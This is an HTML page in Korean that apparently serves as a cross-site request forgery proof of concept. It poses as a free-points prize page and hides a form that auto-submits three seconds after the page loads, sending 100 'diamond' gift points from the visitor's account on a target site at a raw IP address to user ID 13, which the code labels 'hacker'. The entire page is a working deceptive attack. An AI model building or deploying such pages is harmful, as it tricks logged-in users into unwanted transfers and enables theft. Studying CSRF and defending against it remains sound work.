<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 무료 포인트 받기</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            color: white;
        }
        .gift-container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 50px;
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
        }
        .gift-box {
            font-size: 8em;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-20px); }
            60% { transform: translateY(-10px); }
        }
        .message {
            font-size: 1.5em;
            margin: 20px 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        .auto-message {
            font-size: 1.2em;
            color: #FFD700;
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <div class="gift-container">
        <div class="gift-box">🎁</div>
        <h1>축하합니다!</h1>
        <p class="message">🎉 특별 이벤트에 당첨되셨습니다!</p>
        <p class="auto-message">💰 포인트를 자동으로 지급하고 있습니다...</p>
        
        <div id="status" style="margin-top: 30px;">
            <p>🔄 처리 중...</p>
        </div>
    </div>

    <!-- 숨겨진 공격 Form -->
    <form id="attackForm" method="POST" action="http://3.36.66.216/profile.php" target="_blank" style="display: none;">
        <input type="hidden" name="receiver_id" value="13">
        <input type="hidden" name="points" value="100">
        <input type="hidden" name="send_gift" value="1">
        <input type="hidden" name="gift_type" value="diamond">
        <input type="hidden" name="message" value="Simple_CSRF_Attack">
    </form>

    <script>
        // 페이지 로드 후 3초 대기 후 공격
        setTimeout(function() {
            document.getElementById('status').innerHTML = '<p style="color: #00FF88;">⚡ 포인트 전송 중...</p>';
            
            // 간단한 Form 전송
            document.getElementById('attackForm').submit();
            
            console.log('🎯 CSRF 공격 실행됨');
            
            // 완료 메시지
            setTimeout(function() {
                document.getElementById('status').innerHTML = 
                    '<p style="color: #00FF88; font-size: 1.3em;">✅ 완료!</p>' +
                    '<p>💰 100 포인트가 전송되었습니다!</p>' +
                    '<p style="margin-top: 20px;">' +
                    '<a href="http://3.36.66.216" target="_blank" style="color: #FFD700; text-decoration: none;">' +
                    '🔍 결과 확인하러 가기 →' +
                    '</a>' +
                    '</p>';
            }, 2000);
            
        }, 3000);
        
        console.log('🎁 Simple CSRF Attack Ready');
        console.log('🎯 Target: hacker (ID: 13)');
    </script>
</body>
</html>
